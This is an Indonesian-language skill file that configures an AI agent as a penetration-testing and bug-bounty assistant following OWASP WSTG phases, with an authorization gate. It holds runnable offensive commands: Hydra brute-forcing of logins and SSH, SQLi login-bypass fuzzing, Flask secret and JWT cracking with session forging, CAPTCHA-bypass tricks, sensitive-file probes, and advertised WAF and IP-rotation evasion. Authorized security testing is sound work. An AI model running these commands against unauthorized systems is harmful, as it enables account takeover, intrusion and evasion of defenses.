---
name: pentest-bugbounty
description: >
  Skill untuk Hermes agent sebagai asisten Security Consultant dan Bug Bounty Hunter.
  Mengikuti metodologi 5-fase penetration testing yang selaras dengan OWASP Web Security
  Testing Guide (WSTG). Mencakup:
  (1) Planning & Scoping — definisi target, RoE, dan batasan testing,
  (2) Reconnaissance — passive & active recon (WSTG-INFO),
  (3) Scanning & Enumeration — vulnerability scanning & entry point identification (WSTG-CONF/IDNT/ATHN/SESS),
  (4) Exploitation — payload crafting, WAF bypass, PoC development (WSTG-INPV/AUTH/BUSL),
  (5) Reporting — dokumentasi temuan, CVSS scoring, dan laporan profesional.
  
  Dilengkapi teknik WAF bypass: obfuscation, encoding (Base64/URL/Hex/Unicode),
  fragmentasi payload, IP rotation, header spoofing, dan browser fingerprinting bypass.
  
  AKTIFKAN SKILL INI SELALU ketika:
  - User menyebut kata kunci: pentest, penetration testing, bug bounty, security testing, vulnerability, exploit, payload, recon, reconnaissance, scanning, enumeration
  - User meminta bantuan untuk testing keamanan web application, API, atau infrastruktur
  - User menyebut: XSS, SQL injection, SQLi, SSRF, XXE, LFI, RFI, IDOR, BOLA, CSRF, command injection, open redirect, path traversal
  - User menyebut: WAF bypass, firewall bypass, obfuscation, encoding payload, bypass detection
  - User meminta: nmap, ffuf, gobuster, nuclei, nikto, sqlmap, subfinder, amass, whatweb, burp suite, hydra
  - User meminta membuat laporan vulnerability, PoC, atau CVSS scoring
  - User menyebut: OWASP, WSTG, CWE, CVE, ASVS, CVSS
  - User meminta recon atau information gathering pada target tertentu
  - User menyebut: HackerOne, Bugcrowd, bug bounty report, responsible disclosure
  
  Target pengguna: Security professional — familiar dengan konsep keamanan dan tools.
---

# 🛡️ Pentest & Bug Bounty — Hermes Agent Skill

Skill ini memandu Hermes agent dalam melakukan web penetration testing dan bug bounty hunting menggunakan **metodologi 5-fase** yang selaras dengan **OWASP Web Security Testing Guide (WSTG)**. Agent akan membimbing user melalui setiap fase secara berurutan, memberikan command yang tepat, dan membantu crafting payload serta reporting.

> ⚠️ **DISCLAIMER ETIS**: Skill ini HANYA untuk **authorized penetration testing** dan **responsible bug bounty hunting**. Pastikan user memiliki **izin legal (Rules of Engagement)** sebelum melakukan testing apapun. Agent WAJIB mengingatkan user tentang batasan etis dan legal di awal setiap sesi.

## 📋 Metodologi: 5-Fase Penetration Testing (OWASP WSTG)

```
    ┌─────────────────────────────────────────────┐
    │     1. PLANNING & SCOPING                   │
    │   Target, RoE, authorization, batasan       │
    └───────────────────┬─────────────────────────┘
                        │  ✓ V1: Scope akurat? V2: RoE valid? V3: Target reachable?
                        ↓
    ┌─────────────────────────────────────────────┐
    │     2. RECONNAISSANCE (WSTG-INFO)           │◄── references/recon_commands.md
    │   Passive & Active Recon, OSINT, enum       │◄── scripts/recon_automation.py
    └───────────────────┬─────────────────────────┘
                        │  ✓ V1: Live host valid? V2: Subdomain confirmed? V3: Dedup bersih?
                        ↓
    ┌─────────────────────────────────────────────┐
    │     3. SCANNING & ENUMERATION               │◄── references/scanning_enumeration.md
    │   Vuln scan, dir/param discovery, config    │◄── references/cwe_checklist.md
    │   (WSTG-CONF/IDNT/ATHN/SESS)               │
    └───────────────────┬─────────────────────────┘
                        │  ✓ V1: Cross-tool confirm? V2: Manual spot-check? V3: Bukan artifact?
                        ↓
    ┌─────────────────────────────────────────────┐
    │     4. EXPLOITATION (WSTG-INPV/AUTH/BUSL)   │◄── references/exploitation_payloads.md
    │   Payload crafting, WAF bypass, PoC         │◄── references/waf_bypass_techniques.md
    └───────────────────┬─────────────────────────┘◄── scripts/payload_generator.py
                        │                            ◄── scripts/waf_bypass_generator.py
                        │  ✓ V1: Reproduce konsisten? V2: Variasi payload? V3: Clean context?
                        ↓
    ┌─────────────────────────────────────────────┐
    │     5. REPORTING                            │◄── references/reporting_template.md
    │   CVSS scoring, laporan, rekomendasi        │◄── scripts/poc_report_generator.py
    └───────────────────┬─────────────────────────┘
                        │                            ◄── scripts/bugbounty_exploiter.py (ALL-IN-ONE)
                        │                            ◄── scripts/pentest_toolkit.py (UNIFIED TOOLKIT)
                        ✓ V1: Evidence lengkap? V2: CVSS akurat? V3: Remediation actionable?

    * Agent secara eksplisit menyebutkan fase aktif, WSTG ID,
      dan CWE yang relevan di setiap respons.
    * Checklist CWE harus diverifikasi (check-off) di references/cwe_checklist.md
      setelah pengujian kerentanan dilakukan menggunakan tools terkait.
    * ⚠️ SETIAP FASE WAJIB melalui Triple Verification sebelum lanjut fase berikutnya.
      Detail protokol: lihat section 0 — Universal Verification Protocol.
```

---

## Fase 1 — Planning & Scoping

**Tujuan**: Mendefinisikan target, batasan, dan otorisasi sebelum testing dimulai.

### 1.1 Pertanyaan Wajib

Sebelum memulai testing, **SELALU** klarifikasi hal berikut:

| # | Pertanyaan | Tujuan |
|---|---|---|
| 1 | Apa target yang akan diuji? (domain, IP, API) | Mendefinisikan scope |
| 2 | Apakah Anda memiliki izin tertulis (RoE)? | Memastikan legalitas |
| 3 | Apa yang in-scope dan out-of-scope? | Membatasi testing |
| 4 | Apakah ada batasan khusus? (no DoS, time window, dll) | Mencegah insiden |
| 5 | Jenis testing? (Black Box / Grey Box / White Box) | Menentukan approach |
| 6 | Platform apa? (Web App, API, Mobile API) | Menentukan metodologi |
| 7 | Apakah ini untuk bug bounty? (HackerOne/Bugcrowd/VDP) | Menentukan format report |
| 8 | Apakah target memiliki form login/CAPTCHA? (Apakah ada test account?) | Memastikan cakupan auth testing & CAPTCHA bypass |

### 1.2 Dokumentasi Scope

```
📋 Planning & Scoping:
- Target         : [domain/IP/API]
- Jenis Testing  : [Black Box / Grey Box / White Box]
- In-Scope       : [daftar asset]
- Out-of-Scope   : [daftar asset yang dikecualikan]
- Batasan        : [no DoS, specific time window, dll]
- Otorisasi      : [dikonfirmasi / belum]
- Platform       : [bug bounty program / internal pentest]
- Next Step      : Lanjut ke Fase 2 — Reconnaissance
```

### 1.3 Validasi Otorisasi

> **PENTING**: Agent TIDAK BOLEH melanjutkan ke Fase 2 tanpa konfirmasi bahwa user memiliki otorisasi yang sah. Jika user menyebutkan target tanpa otorisasi, ingatkan tentang:
> - Undang-undang yang berlaku (UU ITE di Indonesia, CFAA di US, Computer Misuse Act di UK)
> - Risiko hukum dari testing tanpa izin
> - Alternatif legal: bug bounty programs, lab environments (HackTheBox, TryHackMe, DVWA)

### 1.4 Triple Verification — Fase 1 (Planning & Scoping)

Sebelum lanjut ke Fase 2, pastikan planning sudah akurat:

```
📋 VERIFICATION CHECKLIST — Fase 1 (Planning & Scoping)

- V1: SCOPE AKURAT?
  [ ] Target domain/IP bisa di-resolve (nslookup/dig)
  [ ] Semua asset in-scope tercatat
  [ ] Out-of-scope jelas dan tidak ambigu

- V2: RoE VALID?
  [ ] Izin tertulis ada (email/contract/bug bounty policy page)
  [ ] Batasan testing jelas (no DoS, time window, dll)
  [ ] Jenis testing disepakati (Black/Grey/White Box)

- V3: TARGET REACHABLE?
  [ ] Target bisa di-ping / di-curl
  [ ] Port utama (80/443) terbuka
  [ ] Tidak ada IP blocking / geo-restriction

- HASIL: 3/3 ✅ = CONFIRMED → lanjut Fase 2
          ≤2 ❌ = FIX DULU sebelum recon
```

---

## Fase 2 — Reconnaissance (WSTG-INFO)

**Tujuan**: Mengumpulkan informasi tentang target untuk memahami attack surface.

**Referensi lengkap**: Baca `references/recon_commands.md`

### 2.1 Passive Reconnaissance (WSTG-INFO-01 to 03)

Tidak berinteraksi langsung dengan target. Menggunakan sumber publik.

```bash
# WHOIS lookup
whois <TARGET_DOMAIN>

# DNS records
dig <TARGET_DOMAIN> ANY +noall +answer

# Certificate Transparency logs
curl -s "https://crt.sh/?q=%25.<TARGET_DOMAIN>&output=json" | jq -r '.[].name_value' | sort -u

# theHarvester — email, subdomain dari sumber publik
theHarvester -d <TARGET_DOMAIN> -b google,bing,linkedin,crtsh -l 500

# Google Dorking (manual di browser)
# site:<TARGET_DOMAIN> filetype:pdf
# site:<TARGET_DOMAIN> inurl:admin
# site:<TARGET_DOMAIN> ext:sql | ext:db | ext:log
```

### 2.2 Active Reconnaissance (WSTG-INFO-04 to 10)

Berinteraksi langsung dengan target. Pastikan sudah diotorisasi.

```bash
# Subdomain enumeration
subfinder -d <TARGET_DOMAIN> -all -o subdomains.txt
amass enum -d <TARGET_DOMAIN> -o amass_subs.txt

# Port scanning
nmap -sV -sC -oN nmap_results.txt <TARGET>

# Full port scan
nmap -p- -sV -oN nmap_full.txt <TARGET>

# Directory bruteforce
ffuf -u https://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# Technology fingerprinting
whatweb https://<TARGET> -v
```

### 2.3 Script Automasi Recon

Gunakan script otomatis untuk recon komprehensif:

```bash
# Full recon automation (menggunakan tools default)
python scripts/recon_automation.py --target <TARGET_DOMAIN> --output results/

# Dry-run (melihat perintah yang akan dijalankan tanpa eksekusi)
python scripts/recon_automation.py --target <TARGET_DOMAIN> --dry-run

# Menggunakan tool subdomain spesifik dan mengaktifkan cek takeover (subzy)
python scripts/recon_automation.py --target <TARGET_DOMAIN> --subdomain-tools "subfinder,assetfinder,crtsh" --takeover

# Menggunakan rustscan untuk port scanning dan nuclei/dalfox untuk vulnerability scanning
python scripts/recon_automation.py --target <TARGET_DOMAIN> --portscan-tool rustscan --vuln-tools "nuclei,dalfox"

# Menjalankan crawling (katana, hakrawler, gau, waybackurls) & filtering (gf, urldedupe)
python scripts/recon_automation.py --target <TARGET_DOMAIN> --skip-portscan --skip-vulnscan
```

Output: JSON report komprehensif berisi DNS records, subdomains (dan hasil takeover), open ports, technologies, unique URLs/endpoints, parameter sensitif, dan vulnerability findings.

### 2.4 Dokumentasi Recon

```
📋 Reconnaissance Report:
- Target          : [domain/IP]
- Fase             : 2 — Reconnaissance (WSTG-INFO)
- Subdomains      : [jumlah ditemukan]
- Open Ports      : [daftar port & service]
- Technologies    : [web server, framework, CMS]
- Directories     : [path menarik]
- Entry Points    : [parameter, form, API endpoint]
- Informasi Publik: [email, leak, credential exposure]
- Next Step       : Triple Verification → Lanjut ke Fase 3 — Scanning & Enumeration
```

### 2.5 Triple Verification — Fase 2 (Reconnaissance)

Sebelum lanjut ke Fase 3, pastikan hasil recon valid dan bersih:

```bash
# ============================================================
# V1: LIVE HOST VALIDATION — apakah subdomain benar-benar hidup?
# ============================================================
# Jangan asumsi semua subdomain hidup. Filter yang benar-benar live.
cat subdomains.txt | httpx -silent -sc -cl -title -o live_verified.txt

# Cek jumlah sebelum dan sesudah filter
echo "Total subdomains: $(wc -l < subdomains.txt)"
echo "Live hosts: $(wc -l < live_verified.txt)"
# Jika > 50% dead → kemungkinan wordlist terlalu luas, sesuaikan

# ============================================================
# V2: SUBDOMAIN CONFIRMED — bukan wildcard DNS / parked domain?
# ============================================================
# Cek wildcard DNS — jika semua random subdomain resolve, ini wildcard
RANDOM_SUB="thisrandomsubdomain$(date +%s).<TARGET_DOMAIN>"
dig +short $RANDOM_SUB | head -1
# Jika resolve → WILDCARD DNS, semua subdomain perlu di-verify manual

# Cek parked domain — response sama untuk semua subdomain?
head -5 live_verified.txt | while read host; do
  size=$(curl -s -o /dev/null -w "%{size_download}" "https://$host" 2>/dev/null)
  echo "$host → $size bytes"
done
# Jika SEMUA size sama → kemungkinan parked/default page

# ============================================================
# V3: DEDUP BERSIH — tidak ada data duplikat / stale?
# ============================================================
# Cek duplikasi di URL list
echo "Total URLs: $(wc -l < all_urls.txt)"
echo "Unique URLs: $(sort -u all_urls.txt | wc -l)"
echo "URLs with params: $(grep -c '=' all_urls.txt)"

# Cek data freshness — pastikan bukan data lama
cat all_urls.txt | unfurl -u domains | sort -u | head -20
# Pastikan semua domain sesuai target, bukan domain lain yang tercampur

# ============================================================
# VERIFICATION CHECKLIST — Fase 2
# ============================================================
# - V1: [ ] Live hosts terfilter dan valid (bukan timeout/DNS error)
# - V2: [ ] Bukan wildcard DNS, bukan parked domain
# - V3: [ ] Dedup bersih, no stale data, no out-of-scope domain
# - HASIL: 3/3 ✅ = CONFIRMED → lanjut Fase 3
#           ≤2 ❌ = FIX DULU — re-run recon dengan parameter lebih ketat
```

---

## Fase 3 — Scanning & Enumeration (WSTG Core Testing)

**Tujuan**: Mengidentifikasi vulnerability secara sistematis dan memahami mekanisme keamanan target.
**Tools utama**: nuclei, nikto, wpscan, ffuf, dirsearch, gobuster, paramspider, arjun, httpx, nmap, naabu, gf

**Referensi lengkap**: Baca `references/scanning_enumeration.md`

---

### 3.0 Pre-Scan: Live Host Validation & URL Crawling

Sebelum scanning, pastikan hanya target live yang di-scan. Gunakan hasil recon dari Fase 2.

```bash
# Filter subdomain yang hidup (dari Fase 2)
cat subdomains.txt | httpx -silent -ports 80,443,8080,8443 -o live_hosts.txt

# httpx dengan teknologi detection + status code + content length
cat subdomains.txt | httpx -silent -td -sc -cl -title -o live_detail.txt

# Crawling URLs dari live hosts (katana — deep crawl)
katana -list live_hosts.txt -d 3 -jc -kf -o katana_urls.txt

# hakrawler — fast crawl untuk JS files & endpoints
cat live_hosts.txt | hakrawler -d 3 -subs -o hakrawler_urls.txt

# gau — fetch known URLs dari AlienVault, Wayback, Common Crawl
cat live_hosts.txt | gau --threads 5 --o gau_urls.txt

# waybackurls — fetch dari Wayback Machine
cat live_hosts.txt | waybackurls > wayback_urls.txt

# Merge semua URLs, deduplicate
cat katana_urls.txt hakrawler_urls.txt gau_urls.txt wayback_urls.txt | sort -u | urldedupe > all_urls.txt

# Extract hanya URLs dengan parameter (potensi injection point)
cat all_urls.txt | grep "=" | sort -u > param_urls.txt
```

---

### 3.1 Automated Vulnerability Scanning (WSTG-INFO-08, WSTG-CONF)

#### 3.1.1 Nuclei — Template-Based Scanner (PRIMARY)

```bash
# Scan dasar — severity critical,high
nuclei -l live_hosts.txt -severity critical,high -o nuclei_critical_high.txt

# Scan semua severity (critical,high,medium,low,info)
nuclei -l live_hosts.txt -severity critical,high,medium,low -o nuclei_all.txt

# Rate-limited scan untuk production target
nuclei -l live_hosts.txt -rate-limit 10 -bulk-size 5 -timeout 10 -o nuclei_safe.txt

# Scan dengan specific tags
nuclei -l live_hosts.txt -tags cve,xss,sqli,ssrf,lfi -o nuclei_tagged.txt

# Scan dengan specific templates
nuclei -l live_hosts.txt -t ~/nuclei-templates/http/vulnerabilities/ -o nuclei_vuln.txt

# Technology detection + exposed panels + misconfigs
nuclei -l live_hosts.txt -tags tech,panel,misconfig,exposure -o nuclei_recon.txt

# Deep scan — semua templates, semua severity, verbose
nuclei -l live_hosts.txt -as -o nuclei_deep.txt -v

# Scan dengan custom header (auth bypass testing)
nuclei -l live_hosts.txt -H "X-Forwarded-For: 127.0.0.1" -severity critical,high -o nuclei_bypass.txt

# Output JSON untuk processing
nuclei -l live_hosts.txt -severity critical,high -json -o nuclei_results.jsonl

# Update templates sebelum scan
nuclei -update-templates
```

#### 3.1.2 Nikto — Web Server Scanner

```bash
# Scan dasar
nikto -h https://<TARGET> -o nikto_results.txt

# Scan dengan tuning (specific tests)
nikto -h https://<TARGET> -Tuning 1234567890abc -o nikto_full.txt
# Tuning options:
# 0 = File Upload
# 1 = Misconfigurations / Default Files
# 2 = Information Disclosure
# 3 = Injection (XSS/Script/HTML)
# 4 = Remote File Retrieval
# 5 = Remote Command Execution
# 6 = SQL Injection
# 7 / a = Authentication Bypass
# 8 / b = Software Identification
# 9 / c = Remote Source Inclusion
# x = Reverse Tuning (exclude)

# Scan multiple ports
nikto -h https://<TARGET> -p 80,443,8080,8443 -o nikto_multiport.txt

# Scan dengan proxy (Burp Suite)
nikto -h https://<TARGET> -useproxy http://127.0.0.1:8080
```

#### 3.1.3 Nmap Vulnerability Scripts

```bash
# Vuln category — semua script kategori vuln
nmap --script vuln -p 80,443 <TARGET> -oN nmap_vuln.txt

# Specific vulnerability scripts
nmap --script http-enum,http-headers,http-methods,http-title -p 80,443 <TARGET> -oN nmap_webinfo.txt

# SSL/TLS audit
nmap --script ssl-enum-ciphers,ssl-cert,ssl-heartbleed -p 443 <TARGET> -oN nmap_ssl.txt

# Full web audit
nmap --script "http-* and not http-brute" -p 80,443 <TARGET> -oN nmap_webaudit.txt
```

#### 3.1.4 WordPress-Specific (WPScan)

```bash
# Full WordPress scan
wpscan --url https://<TARGET> --enumerate ap,at,u --o wpscan_results.txt

# Enumerate: ap=All Plugins, at=All Themes, u=Users
wpscan --url https://<TARGET> --enumerate vp,vt --detection-mode aggressive -o wpscan_vuln.txt

# Bruteforce login
wpscan --url https://<TARGET> --passwords /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt --usernames admin

# API token (untuk vulnerability database)
wpscan --url https://<TARGET> --api-token YOUR_TOKEN --enumerate vp,vt,cb,dbe
```

---

### 3.2 Directory & Path Discovery (WSTG-CONF-02, WSTG-INFO-04)

#### 3.2.1 ffuf — Fast Web Fuzzer (PRIMARY)

```bash
# Directory bruteforce — common wordlist
ffuf -u https://<TARGET>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,403 -fs 0 -o ffuf_dirs.json -of json

# Directory bruteforce — medium wordlist (lebih dalam)
ffuf -u https://<TARGET>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -mc 200,301,302,403 -fs 0 -recursion -recursion-depth 2 -o ffuf_deep.json -of json

# API endpoint discovery
ffuf -u https://<TARGET>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt \
  -mc 200,201,301,302,401,403,405 -o ffuf_api.json -of json

# Extension bruteforce (php, asp, jsp, html, txt, bak)
ffuf -u https://<TARGET>/FUZZ.EXT \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -e .php,.asp,.aspx,.jsp,.html,.txt,.bak,.old,.conf,.log,.sql \
  -mc 200,301,302 -o ffuf_ext.json -of json

# Virtual host discovery
ffuf -u https://<TARGET> -H "Host: FUZZ.<TARGET>" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <FILTER_SIZE> -o ffuf_vhost.json -of json

# Recursive scan dengan filter size (hilangkan false positive)
ffuf -u https://<TARGET>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,403 -fs <SIZE_TO_FILTER> -recursion -recursion-depth 2 \
  -ic -o ffuf_recursive.json -of json

# Backup file discovery
ffuf -u https://<TARGET>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/backup-files.txt \
  -mc 200 -o ffuf_backup.json -of json
```

#### 3.2.2 dirsearch — Advanced Web Path Scanner

```bash
# Full scan
dirsearch -u https://<TARGET> -e php,asp,aspx,jsp,html,txt,bak -o dirsearch_results.txt

# Recursive scan
dirsearch -u https://<TARGET> -e php,asp,jsp -r -R 3 -o dirsearch_recursive.txt

# Scan dengan custom wordlist
dirsearch -u https://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/common.txt -o dirsearch_custom.txt

# Scan dari list URL
dirsearch -l live_hosts.txt -e php,asp,jsp -o dirsearch_batch.txt
```

#### 3.2.3 gobuster — Directory & DNS Bruteforce

```bash
# Directory mode
gobuster dir -u https://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,asp,jsp,html,txt -o gobuster_dirs.txt

# DNS subdomain bruteforce
gobuster dns -d <TARGET> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -o gobuster_dns.txt

# VHost mode
gobuster vhost -u https://<TARGET> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -o gobuster_vhost.txt
```

---

### 3.3 Parameter Discovery & Analysis (WSTG-INPV)

#### 3.3.1 paramspider — Mine Parameters from Web Archives

```bash
# Mine parameters dari Wayback, Common Crawl, dll
paramspider -d <TARGET_DOMAIN> -o paramspider_results.txt

# Output berisi URLs dengan parameter yang ditemukan di web archives
# Contoh: https://target.com/page?id=1&name=test
```

#### 3.3.2 arjun — HTTP Parameter Discovery

```bash
# Discover GET parameters
arjun -u https://<TARGET>/endpoint -o arjun_get.json

# Discover POST parameters
arjun -u https://<TARGET>/endpoint -m POST -o arjun_post.json

# Discover JSON parameters
arjun -u https://<TARGET>/endpoint -m JSON -o arjun_json.json

# Custom wordlist
arjun -u https://<TARGET>/endpoint -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Scan from URL list
arjun -i live_hosts.txt -o arjun_batch.json
```

#### 3.3.3 gf — Pattern-Based Analysis (Find Interesting Endpoints)

```bash
# gf menggunakan pattern files di ~/.gf/
# Cek pattern yang tersedia:
ls ~/.gf/*.json 2>/dev/null

# Find potential XSS reflection points
cat all_urls.txt | gf xss > gf_xss.txt

# Find potential SQL injection points
cat all_urls.txt | gf sqli > gf_sqli.txt

# Find potential SSRF points
cat all_urls.txt | gf ssrf > gf_ssrf.txt

# Find potential LFI/RFI points
cat all_urls.txt | gf lfi > gf_lfi.txt

# Find potential IDOR points
cat all_urls.txt | gf idor > gf_idor.txt

# Find potential redirect points
cat all_urls.txt | gf redirect > gf_redirect.txt

# Find potential debug endpoints
cat all_urls.txt | gf debug > gf_debug.txt

# Find potential s3 bucket URLs
cat all_urls.txt | gf s3-buckets > gf_s3.txt

# Custom pattern — buat file ~/.gf/custom.json
# Format: "match_string1\\nmatch_string2\\n"
```

---

### 3.4 Configuration Testing (WSTG-CONF)

#### 3.4.1 TLS/SSL Testing

```bash
# SSL cipher enumeration
nmap --script ssl-enum-ciphers -p 443 <TARGET> -oN ssl_ciphers.txt

# Heartbleed check
nmap --script ssl-heartbleed -p 443 <TARGET>

# Certificate info
nmap --script ssl-cert -p 443 <TARGET> -oN ssl_cert.txt

# HTTP/2 support check
curl -sI --http2 https://<TARGET> 2>&1 | head -5
```

#### 3.4.2 Security Headers Audit

```bash
# Full header dump
curl -sI https://<TARGET> -o headers_raw.txt
cat headers_raw.txt

# Security headers checklist
echo "=== Security Headers Check ===" > headers_audit.txt
curl -sI https://<TARGET> >> headers_audit.txt
echo "" >> headers_audit.txt
echo "Missing headers:" >> headers_audit.txt

# Check each header individually
for header in "Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" \
  "X-Content-Type-Options" "Referrer-Policy" "Permissions-Policy" "X-XSS-Protection"; do
  if ! curl -sI https://<TARGET> | grep -qi "$header"; then
    echo "  [MISSING] $header" >> headers_audit.txt
  else
    echo "  [FOUND] $header" >> headers_audit.txt
  fi
done
cat headers_audit.txt
```

#### 3.4.3 HTTP Methods & CORS Testing

```bash
# HTTP methods
curl -X OPTIONS -I https://<TARGET>
nmap --script http-methods -p 80,443 <TARGET> --script-args http-methods.url-path=/api

# CORS test — check if origin reflected
curl -sI -H "Origin: https://evil.com" https://<TARGET>/api/ 2>&1 | grep -i "access-control"

# CORS test — null origin
curl -sI -H "Origin: null" https://<TARGET>/api/ 2>&1 | grep -i "access-control"

# CORS test — subdomain wildcard
curl -sI -H "Origin: https://evil.<TARGET>" https://<TARGET>/api/ 2>&1 | grep -i "access-control"
```

#### 3.4.4 Technology Fingerprinting

```bash
# whatweb — detailed tech detection
whatweb https://<TARGET> -v -o whatweb_results.txt

# httpx — tech detection dari list
cat live_hosts.txt | httpx -td -sc -cl -title -server -o httpx_tech.txt

# Check common sensitive files
for path in robots.txt sitemap.xml .well-known/security.txt .env .git/config \
  wp-config.php.bak web.config.bak crossdomain.xml clientaccesspolicy.xml \
  .htaccess .htpasswd server-status server-info; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://<TARGET>/$path")
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "[$code] https://<TARGET>/$path"
  fi
done
```

---

### 3.5 Authentication Testing (WSTG-ATHN)

#### 3.5.1 Default Credentials & Brute Force

```bash
# Hydra — HTTP POST form brute force
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
  https-post-form "<TARGET>:/login:username=^USER^&password=^PASS^:F=incorrect" -V

# Hydra — dengan custom header
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
  https-post-form "<TARGET>:/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:F=error:H=Content-Type: application/json" -V

# Hydra — FTP, SSH, SMB brute force
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
  <TARGET> ssh -V

# Hydra — HTTP Basic Auth
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
  <TARGET> http-get /admin -V
```

#### 3.5.2 Login Bypass Testing

```bash
# SQLi auth bypass via ffuf
ffuf -u https://<TARGET>/login -X POST \
  -d "username=FUZZ&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Fuzzing/Databases/SQLi/sqli.auth.bypass.txt \
  -fc 401,403 -fs <FILTER_SIZE> -o ffuf_loginbypass.json -of json

# SQLi auth bypass — JSON body
ffuf -u https://<TARGET>/api/login -X POST \
  -d '{"username":"FUZZ","password":"test"}' \
  -H "Content-Type: application/json" \
  -w /usr/share/seclists/Fuzzing/Databases/SQLi/sqli.auth.bypass.txt \
  -fc 401,403 -o ffuf_loginbypass_json.json -of json

# Test common default credentials
ffuf -u https://<TARGET>/login -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
  -fc 401 -o ffuf_defaultcreds.json -of json
```

#### 3.5.3 Flask Session Cracking

```bash
# Flask-Unsign — decode Flask session cookie
flask-unsign --decode --cookie 'session=<COOKIE_VALUE>'

# Flask-Unsign — crack secret key
flask-unsign --unsign --cookie 'session=<COOKIE_VALUE>' \
  --wordlist /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

# Flask-Unsign — sign new session with cracked secret
flask-unsign --sign --cookie '{"user":"admin"}' --secret 'cracked_secret'
```

#### 3.5.4 CAPTCHA Bypass & Form Login Handling (WSTG-ATHN)

```text
Checklist bypass CAPTCHA & proteksi form login:
1. Reusable CAPTCHA: Intercept request login yang memiliki CAPTCHA valid, lalu lakukan Replay Attack. Jika sukses terus menerus, CAPTCHA bisa di-reuse.
2. CAPTCHA Omission: Hapus parameter CAPTCHA sepenuhnya dari request body (misal hapus `g-recaptcha-response`).
3. Empty CAPTCHA: Kirim parameter CAPTCHA tetapi biarkan valuenya kosong (`g-recaptcha-response=`).
4. Content-Type Switch: Ubah request `application/x-www-form-urlencoded` ke `application/json` (atau sebaliknya).
5. Method Switch: Ubah HTTP method dari POST ke GET, atau gunakan method override header.
6. Alternate Endpoints: Cari endpoint login lain seperti `/api/login`, `/mobile/login`, `/v1/auth`. Endpoint API sering tidak dilindungi CAPTCHA.
```

---

### 3.6 Session Management Testing (WSTG-SESS)

```bash
# Cookie analysis
curl -v -c cookies.txt https://<TARGET>/login -d "username=test&password=test" 2>&1 | grep -i "set-cookie"

# Checklist cookie attributes:
# - [ ] Secure flag
# - [ ] HttpOnly flag
# - [ ] SameSite attribute
# - [ ] Domain/Path scope
# - [ ] Expires/Max-Age

# JWT cracking (jika menggunakan JWT)
hashcat -a 0 -m 16500 jwt.txt /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt --force

# JWT decode (tanpa crack — lihat payload)
echo "<JWT_TOKEN>" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Session fixation test — apakah session berubah setelah login?
# 1. Request login page, catat session cookie
# 2. Login dengan credentials valid
# 3. Bandingkan session cookie sebelum dan sesudah login
# Jika SAMA = VULNERABLE (session fixation)
```

---

### 3.7 URL Filtering & Pattern Analysis

Setelah mengumpulkan semua URLs, filter berdasarkan potensi vulnerability:

```bash
# === Extract URLs with parameters (injection points) ===
cat all_urls.txt | grep "=" | sort -u > param_urls.txt
echo "[+] URLs with parameters: $(wc -l < param_urls.txt)"

# === GF Pattern Analysis ===
# Pastikan gf patterns terinstall: ls ~/.gf/
cat param_urls.txt | gf xss > gf_xss_potential.txt
cat param_urls.txt | gf sqli > gf_sqli_potential.txt
cat param_urls.txt | gf ssrf > gf_ssrf_potential.txt
cat param_urls.txt | gf lfi > gf_lfi_potential.txt
cat param_urls.txt | gf idor > gf_idor_potential.txt
cat param_urls.txt | gf redirect > gf_redirect_potential.txt
cat param_urls.txt | gf rce > gf_rce_potential.txt
cat param_urls.txt | gf ssti > gf_ssti_potential.txt

# === Unfurl — extract paths, keys, values ===
cat all_urls.txt | unfurl -u paths | sort -u > unique_paths.txt
cat all_urls.txt | unfurl keys | sort -u > unique_params.txt

# === Filter by response size (find anomalies) ===
# ffuf dengan -fs untuk filter response size tertentu
ffuf -u https://<TARGET>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc all -o ffuf_all.json -of json
# Kemudian analisis response size yang berbeda dari normal
```

---

### 3.8 Entry Point Identification Summary

```bash
# === Konsolidasi semua entry points ===
echo "=== Entry Points Summary ===" > entry_points.txt
echo "" >> entry_points.txt
echo "[1] URLs with parameters (from paramspider + crawling):" >> entry_points.txt
wc -l param_urls.txt >> entry_points.txt
echo "" >> entry_points.txt
echo "[2] XSS potential:" >> entry_points.txt
wc -l gf_xss_potential.txt >> entry_points.txt
echo "" >> entry_points.txt
echo "[3] SQLi potential:" >> entry_points.txt
wc -l gf_sqli_potential.txt >> entry_points.txt
echo "" >> entry_points.txt
echo "[4] SSRF potential:" >> entry_points.txt
wc -l gf_ssrf_potential.txt >> entry_points.txt
echo "" >> entry_points.txt
echo "[5] LFI potential:" >> entry_points.txt
wc -l gf_lfi_potential.txt >> entry_points.txt
